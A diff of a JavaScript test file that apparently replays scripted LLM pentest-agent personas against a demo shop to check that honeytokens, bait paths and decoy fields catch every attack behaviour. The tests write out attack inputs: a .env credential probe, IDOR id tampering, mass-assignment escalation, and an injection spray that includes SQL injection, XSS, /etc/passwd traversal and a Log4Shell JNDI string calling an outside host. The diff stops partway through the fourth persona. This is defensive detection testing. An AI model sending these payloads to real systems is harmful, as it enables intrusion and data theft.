@@ -1,6 +1,6 @@
-// Scripted re-enactments of how LLM pentest agents behave, run against the
-// demo shop. Each persona is a different attacker strategy; the claim under
-// test is that every *attack behaviour* trips a wire, including for an agent
+// Scripted versions of how LLM pentest agents behave, run against the demo
+// shop. Each persona uses a different attacker strategy. The claim under test
+// is that every attack behaviour triggers a detection, including for an agent
 // that was told to ignore instructions embedded in pages.
 import assert from 'node:assert/strict';
 import { after, before, test } from 'node:test';
@@ -28,7 +28,7 @@ after(async () => {
   await new Promise((r) => server.close(r));
 });
 
-/** A tiny HTTP client that behaves like an agent's tool: it keeps cookies and a fixed identity. */
+/** A small HTTP client that behaves like an agent's tool. It keeps cookies and a fixed identity. */
 function client(identity) {
   const jar = new Map();
   // Every persona gets its own source address via X-Forwarded-For (trusted from loopback).
@@ -57,7 +57,7 @@ async function eventsFor(ip) {
   return sink.events.filter((e) => e.source?.ip === ip);
 }
 
-test('honest customer: browses, searches, signs in, views orders: zero alerts', async () => {
+test('an honest customer who browses, searches, signs in and views orders raises zero alerts', async () => {
   const ip = '198.51.100.10';
   const http = client({ ip, ua: BROWSER });
   await http('/');
@@ -67,7 +67,7 @@ test('honest customer: browses, searches, signs in, views orders: zero alerts', 
   await http('/login', form({ email: 'demo@northwind.test', password: 'demo1234' }));
   await http('/account');
   const me = JSON.parse((await http('/api/me')).text);
-  // A typical SPA pattern: send the whole object back with one change.
+  // A typical SPA pattern sends the whole object back with one change.
   await http('/api/me', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ ...me, name: 'Demo C.' }) });
   const { orders } = JSON.parse((await http('/api/orders')).text);
   for (const o of orders) assert.equal((await http(`/api/orders/${encodeURIComponent(o.id)}`)).status, 200);
@@ -76,7 +76,7 @@ test('honest customer: browses, searches, signs in, views orders: zero alerts', 
   assert.deepEqual(events.map((e) => e.rule), [], 'an honest customer must not raise a single alert');
 });
 
-test('persona 1, "curious agent": reads the page source and follows the leaked key', async () => {
+test('persona 1, the curious agent, reads the page source and follows the leaked key', async () => {
   const ip = '203.0.113.21';
   const http = client({ ip, ua: AGENT_UA });
   const home = (await http('/')).text;
@@ -90,13 +90,13 @@ test('persona 1, "curious agent": reads the page source and follows the leaked k
   const dump = await http(route, { headers: { authorization: `Bearer ${key}` } });
   assert.equal(dump.status, 200);
   const data = JSON.parse(dump.text);
-  assert.equal(data.data.length, 25, 'the agent "finds" a user table; every record is fabricated');
+  assert.equal(data.data.length, 25, 'the agent sees a user table, but every record is fabricated');
 
   const rules = (await eventsFor(ip)).map((e) => e.rule);
   assert.ok(rules.includes('honeytoken.used') && rules.includes('session.flagged'), String(rules));
 });
 
-test('persona 2, "instruction-hardened agent": ignores page text, runs a standard checklist, still caught', async () => {
+test('persona 2, the instruction-hardened agent, ignores page text and runs a standard checklist but is still caught', async () => {
   // This agent never reads comments or hidden text. It probes for leaked
   // config files (a checklist item every pentest agent runs) and then tries
   // what it found against the login form.
@@ -106,7 +106,7 @@ test('persona 2, "instruction-hardened agent": ignores page text, runs a standar
   assert.equal(env.status, 200);
   const adminEmail = /^ADMIN_EMAIL=(.*)$/m.exec(env.text)[1];
   const adminPassword = /^ADMIN_PASSWORD=(.*)$/m.exec(env.text)[1];
-  // Agents often rotate egress IPs between phases; attribution survives it.
+  // Agents often rotate egress IPs between phases. Attribution still works.
   const rotated = client({ ip: '192.0.2.77', ua: 'python-httpx/0.27' });
   const login = await rotated('/login', form({ email: adminEmail, password: adminPassword }));
   assert.equal(login.status, 401, 'the fake credentials do not work on the real app');
@@ -118,26 +118,26 @@ test('persona 2, "instruction-hardened agent": ignores page text, runs a standar
   assert.equal(used.evidence.cross_session, true);
   const probe = (await eventsFor(ip)).find((e) => e.rule === 'bait.path');
   assert.equal(used.evidence.issued_to_session, probe.session.id.slice(0, 8), 'traced back to the probing session');
-  assert.ok(sink.events.some((e) => e.rule === 'session.flagged' && e.evidence.linked_from_session), 'probing session linked & flagged');
+  assert.ok(sink.events.some((e) => e.rule === 'session.flagged' && e.evidence.linked_from_session), 'the probing session is linked and flagged');
 });
 
-test('persona 3, "careful agent": real account, no probing, tests IDOR and mass assignment', async () => {
+test('persona 3, the careful agent, uses a real account without probing and tests IDOR and mass assignment', async () => {
   const ip = '203.0.113.23';
   const http = client({ ip, ua: AGENT_UA });
   await http('/login', form({ email: 'demo@northwind.test', password: 'demo1234' }));
   const me = JSON.parse((await http('/api/me')).text);
   const { orders } = JSON.parse((await http('/api/orders')).text);
 
-  // IDOR: increment the order id.
+  // IDOR test. Increment the order id.
   const [, num, sig] = /^(\d+)~(.+)$/.exec(orders[0].id);
   const neighbour = await http(`/api/orders/${Number(num) + 1}~${sig}`);
   assert.equal(neighbour.status, 404);
   const stripped = await http(`/api/orders/${Number(num) - 1}`);
   assert.equal(stripped.status, 404);
 
-  // Mass assignment: escalate every privilege-looking field in the profile.
+  // Mass assignment test. Escalate every privilege-looking field in the profile.
   const escalate = Object.fromEntries(Object.keys(me).filter((k) => /role|tier|scope|level|access|flags/.test(k)).map((k) => [k, 'admin']));
-  assert.ok(Object.keys(escalate).length >= 2, `decoy field present in /api/me: ${Object.keys(me)}`);
+  assert.ok(Object.keys(escalate).length >= 2, `decoy field should be present in /api/me, keys are ${Object.keys(me)}`);
   await http('/api/me', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify(escalate) });
 
   const rules = (await eventsFor(ip)).map((e) => e.rule);
@@ -146,7 +146,7 @@ test('persona 3, "careful agent": real account, no probing, tests IDOR and mass 
   assert.ok(rules.includes('session.flagged'), String(rules));
 });
 
-test('persona 4, "noisy scanner": payload spraying and wordlist enumeration', async () => {
+test('persona 4, the noisy scanner, sprays payloads and enumerates a wordlist', async () => {
   const ip = '203.0.113.24';
   const http = client({ ip, ua: AGENT_UA });
   for (const q of ["' OR 1=1--", '{{7*7}}', '<script>alert(1)</script>', '../../../../etc/passwd', '${jndi:ldap://x.oast.fun/a}']) {
